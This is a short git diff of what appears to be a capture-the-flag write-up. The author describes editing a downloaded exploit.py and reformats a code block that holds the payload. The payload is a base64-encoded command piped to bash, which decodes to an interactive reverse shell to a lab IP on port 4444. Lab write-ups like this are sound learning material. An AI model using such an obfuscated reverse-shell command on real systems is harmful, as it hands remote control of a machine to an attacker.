@@ -60,7 +60,9 @@ My google search:
 I got the `exploit.py`, read it to make sure there were no crypto miners and then got it on my VM, then I edited it to be exactly how I want it (went over to [revshells.com](https://www.revshells.com/) and got my own payload that I use regularly)
 
 **Payload**:
-```echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTAvNDQ0NCAwPiYx' | base64 -d | bash``` 
+```
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTAvNDQ0NCAwPiYx' | base64 -d | bash
+```  
 Make sure to replace it with your settings though, like your IPv4 address and port number etc etc  
 ## Getting our payload to work
 I couldn't get it to work on the python3 virtual environment with the requirements.txt file, instead I used `Docker` for it and it worked!
